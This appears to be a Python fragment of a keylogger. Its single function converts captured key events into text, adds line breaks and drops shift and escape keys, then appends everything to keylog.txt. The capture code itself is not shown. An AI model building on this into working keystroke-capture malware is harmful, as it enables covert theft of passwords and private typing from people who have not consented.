count = 0

def write_to_file(keys_pressed):
	global count
	MAX_CHAR_COUNT = 75

	with open("keylog.txt", "a") as keylog:
		for key in keys_pressed:
			key_string = str(key)
			if (key_string == "\"'\""):
				parsed_key = key_string.strip('\"')
			else:
				parsed_key = key_string.strip('\'')
				if (key_string == "Key.space"):
					parsed_key = ' '
					if (count >= MAX_CHAR_COUNT):
						parsed_key = "\n"
						count = 0
				elif (key_string == "Key.shift" or key_string == "Key.esc"):
					parsed_key = ''
			keylog.write(parsed_key)
			count += 1
	keylog.close()
